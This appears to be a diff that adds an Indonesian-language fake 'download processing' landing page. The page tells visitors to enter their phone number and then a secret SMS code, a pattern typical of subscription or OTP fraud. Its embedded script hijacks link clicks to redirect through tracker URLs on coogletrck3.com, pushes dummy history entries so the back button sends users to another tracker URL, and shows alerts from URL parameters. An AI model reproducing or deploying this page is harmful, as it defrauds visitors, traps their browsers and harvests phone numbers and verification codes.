@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <base href="">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no">
+    <title>Memproses Unduh</title>
+    <style>
+        select:-moz-focusring {
+            color: transparent;
+            text-shadow: 0 0 0 #000;
+        }
+        a:focus,
+        a:active,
+        button::-moz-focus-inner,
+        input[type="reset"]::-moz-focus-inner,
+        input[type="button"]::-moz-focus-inner,
+        input[type="submit"]::-moz-focus-inner,
+        select::-moz-focus-inner,
+        input[type="file"]>input[type="button"]::-moz-focus-inner {
+            border: 0;
+            outline: 0;
+        }
+        input[type="submit"],
+        input[type="button"],
+        input[type="image"] {
+            outline: 0;
+        }
+        button {
+            -webkit-appearance: none;
+            outline: none;
+            border: none;
+        }
+        a {
+            text-decoration: none;
+        }
+        .wrapper {
+            margin: 0 auto;
+            text-align: center;
+        }
+        .show {
+            display: block;
+        }
+        .hide {
+            display: none;
+        }
+        .clear {
+            clear: both;
+        }
+        .ltr {
+            direction: ltr;
+            display: inline-block;
+        }
+        .rtl {
+            direction: rtl;
+            display: inline-block;
+        }
+        body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 12px;
+            color: #333333;
+            background-color: #ffffff;
+        }
+        a {
+            text-decoration: none;
+            color: #333333;
+        }
+        .title {
+            padding: 20px 5px;
+            color: #c80000;
+            font-size: 32px;
+            line-height: 32px;
+            font-weight: bold;
+        }
+        .loadbar {
+            padding: 0px 2px 5px 2px;
+        }
+        .imgloadbar {
+            max-width: 300px;
+            width: 100%;
+        }
+        .txt {
+            padding: 0px 0px 10px 0px;
+            font-size: 17px;
+            line-height: 19px;
+        }
+        .desript {
+            padding: 5px 5px 5px 5px;
+            max-width: 400px;
+            text-align: left;
+        }
+        .s1,
+        .s2,
+        .s3,
+        .s4 {
+            padding: 0px 5px 15px 5px;
+            font-size: 20px;
+            line-height: 24px;
+        }
+        .btnwrap {
+            margin: 10px 0px;
+        }
+        .bluebtn {
+            max-width: 150px;
+            width: 100%;
+            padding: 10px 50px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            text-align: center;
+            text-shadow: 0px 1px 0px rgba(0, 0, 0, 0.20);
+            -moz-text-shadow: 0px 1px 0px rgba(0, 0, 0, 0.20);
+            -o-text-shadow: 0px 1px 0px rgba(0, 0, 0, 0.20);
+            -ms-text-shadow: 0px 1px 0px rgba(0, 0, 0, 0.20);
+            -khtml-text-shadow: 0px 1px 0px rgba(0, 0, 0, 0.20);
+            border: 1px solid #d14b4b;
+            border-radius: 5px;
+            -moz-border-radius: 5px;
+            -webkit-border-radius: 5px;
+            -khtml-border-radius: 5px;
+            background: #ea1f24;
+        }
+        .bluebtn:hover {
+            background: #ea1f24;
+        }
+        .bluebtn:active {
+            position: relative;
+            top: 1px;
+        }
+        .blink {
+            -webkit-animation: blink 1s infinite;
+            -moz-animation: blink 1s infinite;
+            -ms-animation: blink 1s infinite;
+            -o-animation: blink 1s infinite;
+            animation: blink 1s infinite
+        }
+        @-webkit-keyframes blink {
+            0% {
+                opacity: 1.0
+            }
+
+            50% {
+                opacity: .0
+            }
+
+            100% {
+                opacity: 1.0
+            }
+        }
+        @-moz-keyframes blink {
+            0% {
+                opacity: 1.0
+            }
+
+            50% {
+                opacity: .0
+            }
+
+            100% {
+                opacity: 1.0
+            }
+        }
+        @-ms-keyframes blink {
+            0% {
+                opacity: 1.0
+            }
+
+            50% {
+                opacity: .0
+            }
+
+            100% {
+                opacity: 1.0
+            }
+        }
+        @-o-keyframes blink {
+            0% {
+                opacity: 1.0
+            }
+
+            50% {
+                opacity: .0
+            }
+
+            100% {
+                opacity: 1.0
+            }
+        }
+        @keyframes blink {
+            0% {
+                opacity: 1.0
+            }
+
+            50% {
+                opacity: .0
+            }
+
+            100% {
+                opacity: 1.0
+            }
+        }
+        .prompt {
+            padding: 0px 5px 5px 5px;
+            font-size: 20px;
+            line-height: 24px;
+            color: #e44a52;
+            opacity: 0;
+        }
+    </style>
+</head>
+<body class="">
+    <div id="app">
+        <center>
+            <div class="container">
+                <div class="title">Memproses Unduh...</div>
+                <div class="loadbar">
+                    <img class="imgloadbar" src="../loadbar.gif">
+                </div>
+                <div class="txt">Jika unduhan Anda tidak dimulai secara otomatis.</div>
+                <div class="prompt">Klik tombol di bawah untuk melanjutkan</div>
+                <div class="desript">
+                    <div class="s1">Langkah 1: Klik OKE untuk menyelesaikan unduhan. </div>
+                    <div class="s2">Langkah 2: Masukkan nomor ponsel Anda</div>
+                    <div class="s3">Langkah 3: Anda akan menerima pesan teks dengan kode rahasia.</div>
+                    <div class="s4">Langkah 4: Masukkan kode rahasia.</div>
+                </div>
+                <div class="btnwrap">
+                    <a href="https://coogletrck3.com/click.php?lp=1" class="bluebtn mainButton">OKE</a>
+                </div>
+            </div>
+        </center>
+    </div>
+<script>
+var cta = 'mainButton';
+var back = 'https://coogletrck3.com/chh9l3k.php?key=0lp9k1kle3m19wqtwn9o';
+var under = 'https://coogletrck3.com/chh9l3k.php?key=1ljqrx4lpjqw93hr8i6m';
+if(typeof under!=="undefined"&&under!==null){if(typeof cta!=="undefined"&&cta!==null){document.addEventListener('click',function(event){var target=event.target;while(target){if(target.tagName==='A'&&target.classList.contains(cta)){const linkHref=target.href;event.preventDefault();window.open(linkHref,'_blank');window.location.replace(under);break;}
+target=target.parentNode;}});}else{document.addEventListener('click',function(event){var target=event.target;while(target){if(target.tagName==='A'){const linkHref=target.href;event.preventDefault();window.open(linkHref,'_blank');window.location.replace(under);break;}
+target=target.parentNode;}});}}
+if(typeof back!=="undefined"&&back!==null){!(function(){var t;try{const URL=window.location.href.split(/[#]/)[0];for(t=0;10>t;++t)history.pushState({},'',URL+'#');onpopstate=function(event){event.state&&location.replace(back);};}catch(o){console.log(o);}})();}
+function getURLParameter_location(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.search)||[,null])[1]||"")}function getURLParameter_hash(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.hash)||[,null])[1]||"")}function getURLParameter(e){var a=null;return getURLParameter_hash(e)?getURLParameter_hash(e):getURLParameter_location(e)} if( getURLParameter('alert') ){ setTimeout( function(){ alert( getURLParameter('alert') ) }, 500 ); }</script>
+</body>
+</html>
